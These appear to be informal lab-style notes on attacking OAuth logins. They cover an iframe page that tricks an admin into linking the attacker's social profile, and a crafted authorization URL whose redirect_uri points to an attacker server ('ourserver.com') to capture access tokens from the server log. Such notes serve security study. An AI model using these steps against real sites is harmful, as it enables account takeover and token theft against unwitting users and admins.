#1
First, login using your own account.
For example click on attach a social profile(OAuth).
Login regulary.

Look into the HTTP history to see how it works.
Usually the server is creating a token and giving it to the OAuth.
Then we use this token to authenticate ourselves with the server using OAuth.

So theoretically if we send an admin the OAuth request and they are logging in,
The OAuth should log us in.

realisticly
We need to copy the the OAuth url and put it in a page, send the page to an admin.
It might work and it might not. usually we should test it on another account first.
The page should look like that

<HTML>
	<iframe src = "link.com">
	</iframe>
<HTML>
this code will simply run the link.

The link should contain some kind of ID like a code,
Make sure you didnt use the code or the code isnt expired. 




#2
If we didnt find any vulner in the OAuth connection, 
we could try logging in -> logging out
and then clicking the logging in again.

This will auto connect us without asking for our data,
because the server can remember us.

This will redirect us with a diffrent request flow that might be vulner.
We should see how this works using the HTTP history

The first request is the auth which redirect us to the OAuth with the code.
The response will return the access token.
We could try to hijack the redirect uri and change it to our own server.
This will return to our server the access token.

Copy the link with the redirect, and change the redirect link

https://link.net/auth?clientid=1234&redirect_uri=ourserver.com&response_type=code...

The only changed part is the part that after the redirect_uri.
Now if we put it in an Iframe and send it to the target, this might send
our server the access token.

we should check the server log to find the token.
